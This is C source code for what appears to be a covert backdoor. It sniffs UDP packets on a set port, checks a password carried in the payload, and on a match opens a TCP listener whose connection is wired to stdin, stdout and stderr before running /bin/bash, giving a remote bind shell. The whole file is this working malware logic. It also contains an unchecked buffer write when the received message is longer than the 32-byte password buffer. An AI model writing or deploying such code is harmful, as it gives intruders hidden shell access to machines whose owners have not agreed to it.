#include <stdio.h>
#include "sock.h"
#include "check.h"
#include "debug.h"

int create_udp_sock(int raw, int udp_port) {
    int sock_fd = 0;
    if(raw) {
        sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);

    } else {
        sock_fd = socket(AF_INET, SOCK_DGRAM, 0);
        }

    if(sock_fd < 0) {
        return -1;
    }

    struct sockaddr_in srv_addr;
    int sock_len = sizeof(srv_addr);

    srv_addr.sin_family = AF_INET;
    if(raw) {
        srv_addr.sin_port = htons(udp_port);
    } else {
        srv_addr.sin_port = htons(udp_port);
    }
    srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    if(bind(sock_fd, (struct sockaddr *)&srv_addr, sock_len) != 0) {
        return -2;
    }

    return sock_fd;
}

int raw_udp(int sock_fd, int tcp_port, int udp_port) {

    unsigned char *recvbuffer = malloc(sizeof(unsigned char) * 1024);
    memset(recvbuffer, 0, 1024);

    char *user_pw = calloc(32, sizeof(char));
    
    unsigned char dest_port_arr[2] = {0};
    unsigned int dest_port = 0;

    int msg_len = recv(sock_fd, recvbuffer, 1024, 0);
    msg_len -= 28;

    memcpy(dest_port_arr, recvbuffer + 22, 2);

    dest_port = dest_port_arr[0];
    dest_port = dest_port << 8;
    dest_port = dest_port | dest_port_arr[1];

    DBG_PRINT(("[RAW][i] Sniffed UDP packet on port: %d\n", dest_port));

    if(dest_port != udp_port) {
        return 0;
    }

    memcpy(user_pw, recvbuffer + 28, 32);

    if(user_pw[msg_len-1] == '\n') {
        user_pw[msg_len-1] = '\0';
    } else {
        user_pw[msg_len] = '\0';
    }


    DBG_PRINT(("[RAW][i] Got user password: %s\n", user_pw));
    int ret = check_password(user_pw);
    if(ret == 0) tcp(tcp_port);

    free(user_pw);

    return 0;
}

int udp(int sock_fd, int tcp_port) {
    char udp_buffer[32] = { 0 };
    struct sockaddr_in srv_addr, cli_addr;
    bzero(&srv_addr, sizeof(srv_addr));

    socklen_t len = sizeof(cli_addr);
    int n = recv(sock_fd, udp_buffer, 32, 0);

    if(udp_buffer[n-1] == '\n') {
        udp_buffer[n-1] = '\0';
    } else {
        udp_buffer[n] = '\0';
    }

    if(n > 1) DBG_PRINT(("[UDP] Got user password: %s\n", udp_buffer));
    int ret = check_password(udp_buffer);
    if(ret == 0) tcp(tcp_port);

    return 0;
}

int tcp(int port) {
    int server_fd, new_socket;
    ssize_t valread;
    struct sockaddr_in address;
    int opt = 1;
    socklen_t addrlen = sizeof(address);
    char buffer[1024] = { 0 };

    if((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) return -1;
    if(setsockopt(server_fd, SOL_SOCKET, SO_REUSEPORT | SO_REUSEPORT, &opt, sizeof(opt)) < 0) return -2;

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(port);

    if(bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) return -3;
    if(listen(server_fd, 1) < 0) return -4; 
    if((new_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen)) < 0) return -5;

    int stdin_copy = dup(0);
    int stdout_copy = dup(1);
    int stderr_copy = dup(2);


    if((dup2(new_socket, 0)) < 0) return -6;
    if((dup2(new_socket, 1)) < 0) return -7;
    if((dup2(new_socket, 2)) < 0) return -8;

    close(server_fd);
    system("/bin/bash");

    if((dup2(stdin_copy, 0)) < 0) return -9;
    if((dup2(stdout_copy, 1)) < 0) return -9;
    if((dup2(stderr_copy, 2)) < 0) return -9;

    close(new_socket);

    return 0;
}
